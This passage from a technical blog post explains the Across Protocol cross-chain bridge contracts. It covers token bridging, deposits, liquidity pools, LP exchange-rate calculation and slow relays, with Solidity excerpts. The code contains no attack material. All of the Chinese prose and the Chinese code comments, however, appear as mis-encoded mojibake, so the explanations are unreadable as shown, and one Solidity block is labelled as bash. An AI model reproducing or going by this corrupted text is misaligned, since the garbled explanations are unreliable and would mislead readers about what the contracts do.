TokenLike(l2Token).balanceOf(address(this));</span><br><span class="line">      require(bridgeDepositBoxBalance &gt; 0, &quot;can&#x27;t bridge zero tokens&quot;);</span><br><span class="line">      require(canBridge(l2Token), &quot;non-whitelisted token or last bridge too recent&quot;);</span><br><span class="line"></span><br><span class="line">      whitelistedTokens[l2Token].lastBridgeTime = uint64(getCurrentTime());</span><br><span class="line"></span><br><span class="line">      StandardBridgeLike(l2GatewayRouter).outboundTransfer(</span><br><span class="line">          whitelistedTokens[l2Token].l1Token, // _l1Token. Address of the L1 token to bridge over.</span><br><span class="line">          whitelistedTokens[l2Token].l1BridgePool, // _to. Withdraw, over the bridge, to the l1 withdraw contract.</span><br><span class="line">          bridgeDepositBoxBalance, // _amount. Send the full balance of the deposit box to bridge.</span><br><span class="line">          &quot;&quot; // _data. We don&#x27;t need to send any data for the bridging action.</span><br><span class="line">      );</span><br><span class="line"></span><br><span class="line">      emit TokensBridged(l2Token, bridgeDepositBoxBalance, l1Gas, msg.sender);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>bridgeTokens</code> ä¸Šæœ‰ä¸€ä¸ªè£…é¥°å™¨ <code>canBridge</code> åŒ…å«ä¸¤ä¸ªåˆ¤æ–­ï¼Œ <code>isWhitelistToken</code> ç”¨äºåˆ¤æ–­å¯¹åº” L2 å±‚ä»£å¸æ˜¯å¦å·²ç»åœ¨ L1 å±‚ä¸Šæ·»åŠ äº†æ¡¥æ¥æ± ï¼Œ <code>_hasEnoughTimeElapsedToBridge</code> ç”¨æ¥å‡å°‘é¢‘ç¹è·¨è¿å¯¼è‡´çš„è´¹ç”¨æ¶ˆè€—é—®é¢˜ï¼Œå› æ­¤è®¾ç½®äº†æœ€å°çš„è·¨é“¾æ¥æ—¶é—´ã€‚</p><p><code>bridgeTokens</code> ä¸»è¦å°±æ˜¯è°ƒç”¨äº† L2 å±‚åŸç”Ÿçš„è·¨é“¾æ–¹æ³•ï¼Œæ¯”å¦‚ <code>outboundTransfer</code>ã€‚</p><h3><span id="deposit"><code>deposit</code></span></h3><p>ç¬¬äºŒä¸ªæ˜¯ <code>deposit</code> æ–¹æ³•ç”¨äºå°† L2 å±‚èµ„äº§è½¬ç§»åˆ°ä»¥å¤ªåŠ L1 å±‚ä¸Šï¼Œå¯¹åº”ä¸å‰ç«¯é¡µé¢ Deposit æ“ä½œã€‚å¯¹åº”ä»£ç ä¸ºï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> bridgeTokens(address l2Token, uint32 l2Gas) public virtual;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> deposit(</span><br><span class="line">    address l1Recipient,</span><br><span class="line">    address l2Token,</span><br><span class="line">    uint256 amount,</span><br><span class="line">    uint64 slowRelayFeePct,</span><br><span class="line">    uint64 instantRelayFeePct,</span><br><span class="line">    uint64 quoteTimestamp</span><br><span class="line">) public payable onlyIfDepositsEnabled(l2Token) <span class="function"><span class="title">nonReentrant</span></span>() &#123;</span><br><span class="line">    require(isWhitelistToken(l2Token), <span class="string">&quot;deposit token not whitelisted&quot;</span>);</span><br><span class="line"></span><br><span class="line">    require(slowRelayFeePct &lt;= 0.25e18, <span class="string">&quot;slowRelayFeePct must be &lt;= 25%&quot;</span>);</span><br><span class="line">    require(instantRelayFeePct &lt;= 0.25e18, <span class="string">&quot;instantRelayFeePct must be &lt;= 25%&quot;</span>);</span><br><span class="line"></span><br><span class="line">    require(</span><br><span class="line">        getCurrentTime() &gt;= quoteTimestamp - 10 minutes &amp;&amp; getCurrentTime() &lt;= quoteTimestamp + 10 minutes,</span><br><span class="line">        <span class="string">&quot;deposit mined after deadline&quot;</span></span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (whitelistedTokens[l2Token].l1Token == l1Weth &amp;&amp; msg.value &gt; 0) &#123;</span><br><span class="line">        require(msg.value == amount, <span class="string">&quot;msg.value must match amount&quot;</span>);</span><br><span class="line">        WETH9Like(address(l2Token)).deposit&#123; value: msg.value &#125;();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> IERC20(l2Token).safeTransferFrom(msg.sender, address(this), amount);</span><br><span class="line"></span><br><span class="line">    emit FundsDeposited(</span><br><span class="line">        chainId,</span><br><span class="line">        numberOfDeposits, // depositId: the current number of deposits acts as a deposit ID (nonce).</span><br><span class="line">        l1Recipient,</span><br><span class="line">        msg.sender,</span><br><span class="line">        whitelistedTokens[l2Token].l1Token,</span><br><span class="line">        l2Token,</span><br><span class="line">        amount,</span><br><span class="line">        slowRelayFeePct,</span><br><span class="line">        instantRelayFeePct,</span><br><span class="line">        quoteTimestamp</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    numberOfDeposits += 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œåˆçº¦åŒºåˆ†äº† ETH å’Œ ERC20 ä»£å¸çš„å­˜å…¥æ–¹å¼ã€‚</p><p>å­˜å…¥èµ„äº§åï¼Œåˆçº¦äº§ç”Ÿäº†ä¸€ä¸ªäº‹ä»¶ <code>FundsDeposited</code>ï¼Œç”¨äºä¸­ç»§è€…ç¨‹åºæ•è·å¹¶è¿›è¡Œèµ„äº§è·¨é“¾ï¼Œäº‹ä»¶ä¿¡æ¯åŒ…å«åˆçº¦éƒ¨ç½²çš„ L2 é“¾IDï¼Œå­˜æ¬¾ID <code>numberOfDeposits</code>ï¼ŒL1å±‚æ¥æ”¶è€…ï¼Œå­˜æ¬¾è€…ï¼ŒL1å’ŒL2å±‚ä»£å¸åœ°å€ï¼Œæ•°é‡å’Œè´¹ç‡ï¼Œä»¥åŠæ—¶é—´æˆ³ã€‚</p><h2><span id="bridgepool">BridgePool</span></h2><p><code>BridgePool</code> åˆçº¦éƒ¨ç½²åœ¨ Layer 1 ä¸Šï¼Œæä¾›äº†ç»™ä¸­ç»§è€…å®Œæˆ Layer2 ä¸Šå­˜æ¬¾è®¢å•çš„å‡½æ•°ã€‚ä¸»è¦åŒ…å«ä»¥ä¸‹åŠŸèƒ½ï¼š</p><ol><li>æµåŠ¨æ€§æä¾›è€…æ·»åŠ å’Œåˆ é™¤æµåŠ¨æ€§çš„æ–¹æ³• <code>addLiquidity</code>ï¼Œ <code>removeLiquidity</code>ï¼›</li><li>æ…¢é€Ÿä¸­ç»§ï¼š <code>relayDeposit</code></li><li>å³æ—¶ä¸­ç»§ï¼š <code>relayAndSpeedUp</code>ï¼Œ <code>speedUpRelay</code></li><li>äº‰è®®ï¼š <code>disputeRelay</code></li><li>è§£å†³ä¸­ç»§ï¼š <code>settleRelay</code></li></ol><h3><span id="gou-zao-qi">æ„é€ å™¨</span></h3><p>åœ¨åˆçº¦åˆå§‹æ—¶ï¼Œåˆçº¦è®¾ç½®äº†å¯¹åº”çš„æ¡¥ç®¡ç†å‘˜åœ°å€ï¼ŒL1ä»£å¸åœ°å€ï¼Œæ¯ç§’çš„ LP è´¹ç‡ï¼Œä»¥åŠæ ‡è¯†æ˜¯å¦ä¸º WETH æ± ã€‚åŒæ—¶ï¼Œé€šè¿‡ <code>syncUmaEcosystemParams</code> å’Œ <code>syncWithBridgeAdminParams</code> ä¸¤ä¸ªæ–¹æ³•åŒæ­¥äº† Optimistic Oracle åœ°å€ä¿¡æ¯ï¼ŒStore çš„åœ°å€ä¿¡æ¯ï¼Œä»¥åŠå¯¹åº”çš„ <code>ProposerBondPct</code> ï¼Œ <code>OptimisticOracleLiveness</code> ç­‰å‚æ•°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  function syncUmaEcosystemParams() public nonReentrant() &#123;</span><br><span class="line">      FinderInterface finder = FinderInterface(bridgeAdmin.finder());</span><br><span class="line">      optimisticOracle = SkinnyOptimisticOracleInterface(</span><br><span class="line">          finder.getImplementationAddress(OracleInterfaces.SkinnyOptimisticOracle)</span><br><span class="line">      );</span><br><span class="line"></span><br><span class="line">      store = StoreInterface(finder.getImplementationAddress(OracleInterfaces.Store));</span><br><span class="line">      l1TokenFinalFee = store.computeFinalFee(address(l1Token)).rawValue;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">function syncWithBridgeAdminParams() public nonReentrant() &#123;</span><br><span class="line">      proposerBondPct = bridgeAdmin.proposerBondPct();</span><br><span class="line">      optimisticOracleLiveness = bridgeAdmin.optimisticOracleLiveness();</span><br><span class="line">      identifier = bridgeAdmin.identifier();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">constructor(</span><br><span class="line">      string memory _lpTokenName,</span><br><span class="line">      string memory _lpTokenSymbol,</span><br><span class="line">      address _bridgeAdmin,</span><br><span class="line">      address _l1Token,</span><br><span class="line">      uint64 _lpFeeRatePerSecond,</span><br><span class="line">      bool _isWethPool,</span><br><span class="line">      address _timer</span><br><span class="line">  ) Testable(_timer) ERC20(_lpTokenName, _lpTokenSymbol) &#123;</span><br><span class="line">      require(bytes(_lpTokenName).length != 0 &amp;&amp; bytes(_lpTokenSymbol).length != 0, &quot;Bad LP token name or symbol&quot;);</span><br><span class="line">      bridgeAdmin = BridgeAdminInterface(_bridgeAdmin);</span><br><span class="line">      l1Token = IERC20(_l1Token);</span><br><span class="line">      lastLpFeeUpdate = uint32(getCurrentTime());</span><br><span class="line">      lpFeeRatePerSecond = _lpFeeRatePerSecond;</span><br><span class="line">      isWethPool = _isWethPool;</span><br><span class="line"></span><br><span class="line">      syncUmaEcosystemParams(); // Fetch OptimisticOracle and Store addresses and L1Token finalFee.</span><br><span class="line">      syncWithBridgeAdminParams(); // Fetch ProposerBondPct OptimisticOracleLiveness, Identifier from the BridgeAdmin.</span><br><span class="line"></span><br><span class="line">      emit LpFeeRateSet(lpFeeRatePerSecond);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3><span id="tian-jia-he-shan-chu-liu-dong-xing">æ·»åŠ å’Œåˆ é™¤æµåŠ¨æ€§</span></h3><p>æˆ‘ä»¬é¦–å…ˆçœ‹åˆ°æ·»åŠ å’Œåˆ é™¤æµåŠ¨æ€§ï¼Œæ·»åŠ æµåŠ¨æ€§å³æµåŠ¨æ€§æä¾›è€…å‘è¿æ¥æ± ä¸­æä¾› L1 ä»£å¸ï¼Œå¹¶è·å–ç›¸åº”æ•°é‡çš„ LP ä»£å¸ä½œä¸ºè¯æ˜ï¼ŒLP ä»£å¸æ•°é‡æ ¹æ®ç°è¡Œæ±‡ç‡è®¡ç®—ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function addLiquidity(uint256 l1TokenAmount) public payable nonReentrant() &#123;</span><br><span class="line">// å¦‚æœæ˜¯ weth æ± ï¼Œè°ƒç”¨å‘é€ msg.valueï¼Œmsg.value ä¸ l1TokenAmount ç›¸åŒ</span><br><span class="line">// å¦åˆ™ï¼Œmsg.value å¿…éœ€ä¸º 0</span><br><span class="line">    require((isWethPool &amp;&amp; msg.value == l1TokenAmount) || msg.value == 0, &quot;Bad add liquidity Eth value&quot;);</span><br><span class="line"></span><br><span class="line"> // ç”±äº `_exchangeRateCurrent()` è¯»å–åˆçº¦çš„ä½™é¢å¹¶ä½¿ç”¨å®ƒæ›´æ–°åˆçº¦çŠ¶æ€ï¼Œ</span><br><span class="line">// å› æ­¤æˆ‘ä»¬å¿…éœ€åœ¨è½¬å…¥ä»»ä½•ä»£å¸ä¹‹å‰è°ƒç”¨</span><br><span class="line">    uint256 lpTokensToMint = (l1TokenAmount * 1e18) / _exchangeRateCurrent();</span><br><span class="line">    _mint(msg.sender, lpTokensToMint);</span><br><span class="line">    liquidReserves += l1TokenAmount;</span><br><span class="line"></span><br><span class="line">    if (msg.value &gt; 0 &amp;&amp; isWethPool) WETH9Like(address(l1Token)).deposit&#123; value: msg.value &#125;();</span><br><span class="line">    else l1Token.safeTransferFrom(msg.sender, address(this), l1TokenAmount);</span><br><span class="line"></span><br><span class="line">    emit LiquidityAdded(l1TokenAmount, lpTokensToMint, msg.sender);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºåˆçº¦æ”¯æŒ WETH ä½œä¸ºæµåŠ¨æ€§æ± ï¼Œå› æ­¤æ·»åŠ æµåŠ¨æ€§åŒºåˆ†äº† WETH å’Œå…¶ä»– ERC20 ä»£å¸çš„æ·»åŠ æ–¹æ³•ã€‚</p><p>æ­¤å¤„çš„éš¾ç‚¹åœ¨äº LP ä»£å¸å’Œ L1 ä»£å¸ä¹‹é—´çš„æ±‡ç‡æ¢ç®— <code>_exchangeRateCurrent</code> çš„å®ç°ï¼Œæˆ‘ä»¬ä»åˆçº¦ä¸­æå–å‡ºäº† <code>_exchangeRateCurrent</code> æ‰€ä½¿ç”¨çš„å‡½æ•°ï¼ŒåŒ…æ‹¬ <code>_updateAccumulatedLpFees</code> å’Œ <code>_sync</code> ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">function _getAccumulatedFees() internal view returns (uint256) &#123;</span><br><span class="line">      uint256 possibleUnpaidFees =</span><br><span class="line">          (undistributedLpFees * lpFeeRatePerSecond * (getCurrentTime() - lastLpFeeUpdate)) / (1e18);</span><br><span class="line">      return possibleUnpaidFees &lt; undistributedLpFees ? possibleUnpaidFees : undistributedLpFees;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _updateAccumulatedLpFees() internal &#123;</span><br><span class="line">      uint256 unallocatedAccumulatedFees = _getAccumulatedFees();</span><br><span class="line"></span><br><span class="line">      undistributedLpFees = undistributedLpFees - unallocatedAccumulatedFees;</span><br><span class="line"></span><br><span class="line">      lastLpFeeUpdate = uint32(getCurrentTime());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">function _sync() internal &#123;</span><br><span class="line">      uint256 l1TokenBalance = l1Token.balanceOf(address(this)) - bonds;</span><br><span class="line">      if (l1TokenBalance &gt; liquidReserves) &#123;</span><br><span class="line">          </span><br><span class="line">          utilizedReserves -= int256(l1TokenBalance - liquidReserves);</span><br><span class="line">          liquidReserves = l1TokenBalance;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">function _exchangeRateCurrent() internal returns (uint256) &#123;</span><br><span class="line">      if (totalSupply() == 0) return 1e18; // initial rate is 1 pre any mint action.</span><br><span class="line"></span><br><span class="line">      _updateAccumulatedLpFees();</span><br><span class="line">      _sync();</span><br><span class="line"></span><br><span class="line">      int256 numerator = int256(liquidReserves) + utilizedReserves - int256(undistributedLpFees);</span><br><span class="line">      return (uint256(numerator) * 1e18) / totalSupply();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>æ¢ç®—æ±‡ç‡ç­‰äºå½“å‰åˆçº¦ä¸­ä»£å¸çš„å‚¨å¤‡ä¸æ€» LP ä¾›åº”é‡çš„æ¯”å€¼ï¼Œè®¡ç®—æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li>æ›´æ–°è‡ªä¸Šæ¬¡æ–¹æ³•è°ƒç”¨ä»¥æ¥çš„ç´¯ç§¯LPè´¹ç”¨ <code>_updateAccumulatedLpFees</code><ol><li>è®¡ç®—å¯èƒ½æœªä»˜çš„è´¹ç”¨ <code>possibleUnpaidFees</code> ï¼Œç­‰äºæœªåˆ†é…çš„ Lp è´¹ç”¨ <code>undistributedLpFees</code> * æ¯ç§’ LP è´¹ç‡ *ï¼ˆå½“å‰æ—¶é—´-ä¸Šæ¬¡æ›´æ–°æ—¶é—´ï¼‰ï¼Œç›®å‰ WETH æ¡¥æ¥æ± ä¸­æ¯ç§’LPè´¹ç‡ä¸º 0.0000015ã€‚</li><li>è®¡ç®—ç´¯ç§¯è´¹ç”¨ <code>unallocatedAccumulatedFees</code> ï¼Œå¦‚æœ <code>possibleUnpaidFees</code> å°äºæœªåˆ†é…çš„ Lp è´¹ç”¨ï¼Œåˆ™æ‰€æœ‰æœªåˆ†é…çš„ LP è´¹ç”¨éƒ½å°†ç”¨äºç´¯ç§¯è´¹ç”¨ï¼›</li><li>å½“å‰æœªåˆ†é… LP è´¹ç”¨ = åŸå…ˆæœªåˆ†é… LP è´¹ç”¨ - ç´¯ç§¯è´¹ç”¨ï¼›</li></ol></li><li>è®¡ç®—ç”±äºä»£å¸æ¡¥æ¥äº§ç”Ÿçš„ä½™é¢å˜åŒ–<ol><li>å½“å‰åˆçº¦ä¸­çš„ä»£å¸å‚¨å¤‡=å½“å‰åˆçº¦ä¸­çš„ä»£å¸æ•°é‡ - è¢«ç»‘å®šåœ¨ä¸­ç»§è¿‡ç¨‹ä¸­çš„ä»£å¸æ•°é‡ï¼›</li><li>å¦‚æœå½“å‰åˆçº¦ä¸­çš„ä»£å¸å‚¨å¤‡å¤§äºæµåŠ¨å‚¨å¤‡ <code>liquidReserves</code>ï¼Œåˆ™è¢«ä½¿ç”¨çš„å‚¨å¤‡  <code>utilizedReserves</code> = åŸå…ˆè¢«ä½¿ç”¨çš„å‚¨å¤‡ -ï¼ˆå½“å‰åˆçº¦ä¸­çš„ä»£å¸å‚¨å¤‡ - æµåŠ¨å‚¨å¤‡ï¼‰ï¼›</li><li>å½“å‰æµåŠ¨æ€§å‚¨å¤‡ = å½“å‰åˆçº¦ä¸­çš„ä»£å¸å‚¨å¤‡ï¼›</li></ol></li><li>è®¡ç®—æ±‡ç‡ï¼š<ol><li>ç»è¿‡æ›´æ–°ä¹‹åï¼Œæ±‡ç‡è®¡ç®—çš„åˆ†å­ï¼šæµåŠ¨å‚¨å¤‡ + è¢«ä½¿ç”¨çš„å‚¨å¤‡ - æœªè¢«åˆ†é… LP è´¹ç”¨ï¼›</li><li>åˆ†å­ä¸LP ä»£å¸æ€»ä¾›åº”é‡çš„æ¯”å€¼å³ä¸ºæ¢ç®—æ±‡ç‡ã€‚</li></ol></li></ol><p>åˆ©ç”¨æ¢ç®—æ±‡ç‡ï¼Œå¯ä»¥è®¡ç®—å¾—åˆ°æ·»åŠ  <code>l1TokenAmount</code> æ•°é‡çš„ä»£å¸æ—¶æ‰€èƒ½å¾—åˆ°çš„ LP ä»£å¸çš„æ•°é‡ã€‚</p><p>å¯¹äºç§»é™¤æµåŠ¨æ€§ï¼Œè¿‡ç¨‹ä¸æ·»åŠ æµåŠ¨æ€§ç›¸åï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function removeLiquidity(uint256 lpTokenAmount, bool sendEth) public nonReentrant() &#123;</span><br><span class="line">    // å¦‚æœæ˜¯ WETH æ± ï¼Œåˆ™åªèƒ½é€šè¿‡å‘é€ ETH æ¥å–å‡ºæµåŠ¨æ€§</span><br><span class="line">    require(!sendEth || isWethPool, &quot;Cant send eth&quot;);</span><br><span class="line">    uint256 l1TokensToReturn = (lpTokenAmount * _exchangeRateCurrent()) / 1e18;</span><br><span class="line"></span><br><span class="line">    // æ£€æŸ¥æ˜¯å¦æœ‰è¶³å¤Ÿçš„æµå‚¨å¤‡æ¥æ”¯æŒå–æ¬¾é‡‘é¢</span><br><span class="line">    require(liquidReserves &gt;= (pendingReserves + l1TokensToReturn), &quot;Utilization too high to remove&quot;);</span><br><span class="line"></span><br><span class="line">    _burn(msg.sender, lpTokenAmount);</span><br><span class="line">    liquidReserves -= l1TokensToReturn;</span><br><span class="line"></span><br><span class="line">    if (sendEth) _unwrapWETHTo(payable(msg.sender), l1TokensToReturn);</span><br><span class="line">    else l1Token.safeTransfer(msg.sender, l1TokensToReturn);</span><br><span class="line"></span><br><span class="line">    emit LiquidityRemoved(l1TokensToReturn, lpTokenAmount, msg.sender);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="man-su-zhong-ji">æ…¢é€Ÿä¸­ç»§</span></h3><p>æ…¢é€Ÿä¸­ç»§ï¼Œä»¥åŠä¹‹åè¦è®¨è®ºçš„å³æ—¶ä¸­ç»§ï¼Œéƒ½ä¼šç”¨åˆ° <code>DepositData</code> å’Œ <code>RelayData</code> è¿™ä¸¤ä¸ªæ•°æ®ï¼Œå‰è€…è¡¨ç¤ºå­˜æ¡†äº¤æ˜“çš„æ•°æ®ï¼Œåè€…è¡¨ç¤ºä¸­ç»§äº¤æ˜“çš„ä¿¡æ¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// æ¥è‡ª L2 å­˜æ¬¾äº¤æ˜“çš„æ•°æ®ã€‚</span><br><span class="line">  struct DepositData &#123;</span><br><span class="line">      uint256 chainId;</span><br><span class="line">      uint64 depositId;</span><br><span class="line">      address payable l1Recipient;</span><br><span class="line">      address l2Sender;</span><br><span class="line">      uint256 amount;</span><br><span class="line">      uint64 slowRelayFeePct;</span><br><span class="line">      uint64 instantRelayFeePct;</span><br><span class="line">      uint32 quoteTimestamp;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">// æ¯ä¸ª L2 å­˜æ¬¾åœ¨ä»»ä½•æ—¶å€™éƒ½å¯ä»¥è¿›è¡Œä¸€æ¬¡ä¸­ç»§å°è¯•ã€‚ ä¸­ç»§å°è¯•çš„ç‰¹å¾åœ¨äºå…¶ RelayDataã€‚</span><br><span class="line">  struct RelayData &#123;</span><br><span class="line">      RelayState relayState;</span><br><span class="line">      address slowRelayer;</span><br><span class="line">      uint32 relayId;</span><br><span class="line">      uint64 realizedLpFeePct;</span><br><span class="line">      uint32 priceRequestTime;</span><br><span class="line">      uint256 proposerBond;</span><br><span class="line">      uint256 finalFee;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æˆ‘ä»¬çœ‹åˆ° <code>relayDeposit</code> æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•ç”±ä¸­ç»§è€…è°ƒç”¨ï¼Œæ‰§è¡Œä» L2 åˆ° L1 çš„æ…¢é€Ÿä¸­ç»§ã€‚å¯¹äºæ¯ä¸€ä¸ªå­˜æ¬¾è€Œè¨€ï¼Œåªèƒ½æœ‰ä¸€ä¸ªå¾…å¤„ç†çš„ä¸­ç»§ï¼Œè¿™ä¸ªå¾…å¤„ç†çš„ä¸­ç»§ä¸åŒ…æ‹¬æœ‰äº‰è®®çš„ä¸­ç»§ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function relayDeposit(DepositData memory depositData, uint64 realizedLpFeePct)</span><br><span class="line">    public</span><br><span class="line">    onlyIfRelaysEnabld()</span><br><span class="line">    nonReentrant()</span><br><span class="line">&#123;</span><br><span class="line">// realizedLPFeePct ä¸è¶…è¿‡ 50%ï¼Œæ…¢é€Ÿå’Œå³æ—¶ä¸­ç»§è´¹ç”¨ä¸è¶…è¿‡25%ï¼Œè´¹ç”¨åˆè®¡ä¸è¶…è¿‡100%</span><br><span class="line">    require(</span><br><span class="line">        depositData.slowRelayFeePct &lt;= 0.25e18 &amp;&amp;</span><br><span class="line">            depositData.instantRelayFeePct &lt;= 0.25e18 &amp;&amp;</span><br><span class="line">            realizedLpFeePct &lt;= 0.5e18,</span><br><span class="line">        &quot;Invalid fees&quot;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // æŸ¥çœ‹æ˜¯å¦å·²ç»æœ‰å¾…å¤„ç†çš„ä¸­ç»§</span><br><span class="line">    bytes32 depositHash = _getDepositHash(depositData);</span><br><span class="line"></span><br><span class="line">// å¯¹äºæœ‰äº‰è®®çš„ä¸­ç»§ï¼Œrelays ä¸­å¯¹åº”çš„ hash ä¼šè¢«åˆ é™¤ï¼Œè¿™ä¸ªæ¡ä»¶å¯ä»¥é€šè¿‡</span><br><span class="line">    require(relays[depositHash] == bytes32(0), &quot;Pending relay exists&quot;);</span><br><span class="line"></span><br><span class="line">// å¦‚æœå­˜æ¬¾æ²¡æœ‰æ­£åœ¨æ‰§è¡Œçš„ä¸­ç»§ï¼Œåˆ™å…³è”è°ƒç”¨è€…çš„ä¸­ç»§å°è¯•</span><br><span class="line">    uint32 priceRequestTime = uint32(getCurrentTime());</span><br><span class="line"></span><br><span class="line">    uint256 proposerBond = _getProposerBond(depositData.amount);</span><br><span class="line"></span><br><span class="line">    // ä¿å­˜æ–°ä¸­ç»§å°è¯•å‚æ•°çš„å“ˆå¸Œå€¼ã€‚</span><br><span class="line">    // æ³¨æ„ï¼šè¿™ä¸ªä¸­ç»§çš„æ´»è·ƒæ—¶é—´ï¼ˆlivenessï¼‰å¯ä»¥åœ¨ BridgeAdmin ä¸­æ›´æ”¹ï¼Œè¿™æ„å‘³ç€æ¯ä¸ªä¸­ç»§éƒ½æœ‰ä¸€ä¸ªæ½œåœ¨çš„å¯å˜æ´»è·ƒæ—¶é—´ã€‚</span><br><span class="line">// è¿™ä¸åº”è¯¥æä¾›ä»»ä½•è¢«åˆ©ç”¨æœºä¼šï¼Œç‰¹åˆ«æ˜¯å› ä¸º BridgeAdmin çŠ¶æ€ï¼ˆåŒ…æ‹¬ liveness å€¼ï¼‰è¢«è®¸å¯ç»™è·¨åŸŸæ‰€æœ‰è€…ã€‚</span><br><span class="line">RelayData memory relayData =</span><br><span class="line">        RelayData(&#123;</span><br><span class="line">            relayState: RelayState.Pending,</span><br><span class="line">            slowRelayer: msg.sender,</span><br><span class="line">            relayId: numberOfRelays++, // æ³¨æ„ï¼šåœ¨å°† relayId è®¾ç½®ä¸ºå…¶å½“å‰å€¼çš„åŒæ—¶å¢åŠ  numberOfRelaysã€‚</span><br><span class="line">            realizedLpFeePct: realizedLpFeePct,</span><br><span class="line">            priceRequestTime: priceRequestTime,</span><br><span class="line">            proposerBond: proposerBond,</span><br><span class="line">            finalFee: l1TokenFinalFee</span><br><span class="line">        &#125;);</span><br><span class="line">    relays[depositHash] = _getRelayDataHash(relayData);</span><br><span class="line"></span><br><span class="line">    bytes32 relayHash = _getRelayHash(depositData, relayData);</span><br><span class="line"></span><br><span class="line">// å¥å…¨æ€§æ£€æŸ¥æ± æ˜¯å¦æœ‰è¶³å¤Ÿçš„ä½™é¢æ¥æ”¯ä»˜ä¸­ç»§é‡‘é¢ + æè®®è€…å¥–åŠ±ã€‚ OptimisticOracle ä»·æ ¼è¯·æ±‚ç»è¿‡æŒ‘æˆ˜æœŸåï¼Œå°†åœ¨ç»“ç®—æ—¶æ”¯ä»˜å¥–åŠ±é‡‘é¢ã€‚</span><br><span class="line">    // æ³¨æ„ï¼šliquidReserves åº”è¯¥æ€»æ˜¯ &lt;= balance - bondsã€‚</span><br><span class="line">    require(liquidReserves - pendingReserves &gt;= depositData.amount, &quot;Insufficient pool balance&quot;);</span><br><span class="line"></span><br><span class="line">// è®¡ç®—æ€»æè®®ä¿è¯é‡‘å¹¶ä»è°ƒç”¨è€…é‚£é‡Œæ‹‰å–ï¼Œä»¥ä¾¿ OptimisticOracle å¯ä»¥ä»è¿™é‡Œæ‹‰å–å®ƒã€‚</span><br><span class="line">    uint256 totalBond = proposerBond + l1TokenFinalFee;</span><br><span class="line">    pendingReserves += depositData.amount; // åœ¨æ­£åœ¨å¤„ç†çš„å‡†å¤‡ä¸­é¢„è®¢æ­¤ä¸­ç»§ä½¿ç”¨çš„æœ€å¤§æµåŠ¨æ€§ã€‚</span><br><span class="line">    bonds += totalBond;</span><br><span class="line"></span><br><span class="line">    l1Token.safeTransferFrom(msg.sender, address(this), totalBond);</span><br><span class="line">    emit DepositRelayed(depositHash, depositData, relayData, relayHash);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œå­˜æ¬¾å“ˆå¸Œä¸ <code>depositData</code> æœ‰å…³ï¼Œä¸­ç»§å“ˆå¸Œä¸ <code>depositData</code> å’Œ <code>relayData</code> éƒ½æœ‰å…³ã€‚æœ€åæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ <code>relayDeposit</code> è¿˜æœªå®é™…ä»˜æ¬¾ç»™ç”¨æˆ·çš„ L1 åœ°å€ï¼Œéœ€è¦ç­‰å¾…ä¸­ç»§è€…å¤„ç†ï¼Œæˆ–è€…é€šè¿‡åŠ é€Ÿå¤„ç†ä¸­ç»§ã€‚</p><h3><span id="jia-su-zhong-ji">åŠ é€Ÿä¸­ç»§</span></h3><p><code>speedUpRelay</code> æ–¹æ³•ç«‹å³å°†å­˜æ¬¾é‡‘é¢å‡å»è´¹ç”¨åè½¬å‘ç»™ <code>l1Recipient</code>ï¼Œå³æ—¶ä¸­ç»§è€…åœ¨å¾…å¤„ç†çš„ä¸­ç»§æŒ‘æˆ˜æœŸåè·å¾—å¥–åŠ±ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  // æˆ‘ä»¬å‡è®¾è°ƒç”¨è€…å·²ç»æ‰§è¡Œäº†é“¾å¤–æ£€æŸ¥ï¼Œä»¥ç¡®ä¿ä»–ä»¬å°è¯•ä¸­ç»§çš„å­˜æ¬¾æ•°æ®æ˜¯æœ‰æ•ˆçš„ã€‚</span><br><span class="line">// å¦‚æœå­˜æ¬¾æ•°æ®æ— æ•ˆï¼Œåˆ™å³æ—¶ä¸­ç»§è€…åœ¨æ— æ•ˆå­˜æ¬¾æ•°æ®å‘ç”Ÿäº‰è®®åæ— æƒæ”¶å›å…¶èµ„é‡‘ã€‚</span><br><span class="line">// æ­¤å¤–ï¼Œæ²¡æœ‰äººèƒ½å¤Ÿé‡æ–°æäº¤æ— æ•ˆå­˜æ¬¾æ•°æ®çš„ä¸­ç»§ï¼Œå› ä¸ºä»–ä»¬çŸ¥é“è¿™å°†å†æ¬¡å¼•èµ·äº‰è®®ã€‚</span><br><span class="line">// 